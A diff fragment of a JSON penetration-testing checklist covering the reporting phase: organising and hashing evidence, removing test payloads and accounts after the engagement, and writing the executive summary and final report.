+        "expected": "All findings have documented CVSS 3.1 base scores. Scoring consistent and defensible.",
+        "tools": [
+          "nvd.nist.gov/vuln-metrics/cvss/v3-calculator",
+          "first.org/cvss/calculator/3.1"
+        ],
+        "cwe": [],
+        "mitre": []
+      },
+      {
+        "id": "DOC-03",
+        "name": "Evidence Organisation & Chain of Custody",
+        "sev": "info",
+        "how": "Organise all evidence per finding with proper naming and hash verification.",
+        "cases": [
+          "Create /findings/F001-SQLi-search-endpoint/ folder per finding",
+          "Screenshots: annotate with red boxes on vulnerable areas",
+          "Burp: right-click request → Save item → save to findings folder",
+          "Burp: Copy as curl command → paste in finding for reproduction",
+          "ZAP: File → Save Session → keep as backup",
+          "sqlmap: --output-dir saves full output including extracted data",
+          "Video recording for complex multi-step findings (OBS Studio)",
+          "Hash evidence files: sha256sum evidence_file → document hash for integrity"
+        ],
+        "expected": "All evidence organised per finding. Each finding independently reproducible from documentation alone.",
+        "tools": [
+          "Greenshot",
+          "Flameshot",
+          "Burp Suite",
+          "OBS Studio"
+        ],
+        "cwe": [],
+        "mitre": []
+      },
+      {
+        "id": "DOC-04",
+        "name": "End-of-Engagement Cleanup",
+        "sev": "info",
+        "how": "Remove all test data, payloads, and test accounts from the application before leaving.",
+        "cases": [
+          "Remove ALL stored XSS payloads from comment fields, profiles, etc.",
+          "Delete ALL test user accounts created during testing",
+          "Remove ANY uploaded test files (web shells, SVG XSS, test images)",
+          "Delete test records: orders, posts, comments containing payloads",
+          "Verify no unintended persistent impact left in the application",
+          "Confirm with client: application functioning normally after testing",
+          "Export final Burp project file to /reports/ folder as backup",
+          "Export OWASP ZAP report to /reports/ folder",
+          "Compile final list of test accounts, what was tested, and what was removed"
+        ],
+        "expected": "Application in exact same state as before testing. All payloads and test data removed. Client confirmed no residual impact.",
+        "tools": [
+          "Application UI",
+          "Burp Suite",
+          "OWASP ZAP"
+        ],
+        "cwe": [],
+        "mitre": []
+      },
+      {
+        "id": "DOC-05",
+        "name": "Executive Summary & Final Report",
+        "sev": "info",
+        "how": "Write executive summary and compile final penetration test report.",
+        "cases": [
+          "Overall risk rating: Critical/High/Medium/Low (based on highest unmitigated finding)",
+          "Finding count by severity: X Critical, Y High, Z Medium, N Low, M Info",
+          "Key findings in business terms (no jargon): \"An attacker can log in as any user without knowing their password\"",
+          "Overall security posture vs industry benchmark (if applicable)",
+          "Top 3-5 prioritized remediation items with business impact",
+          "Positive findings: what security controls work well (good for client morale)",
+          "Testing methodology: tools used, scope tested, test dates, environment type",
+          "Appendix: full technical findings + CVSS scores + CWE references + OWASP references"
+        ],
+        "expected": "Executive summary understandable to non-technical C-suite. Full technical report with all findings, evidence, and remediation.",
+        "tools": [
+          "Report template",
+          "Word processor",
+          "LaTeX"
+        ],
+        "cwe": [],
+        "mitre": []
+      }
+    ]
+  }
+]
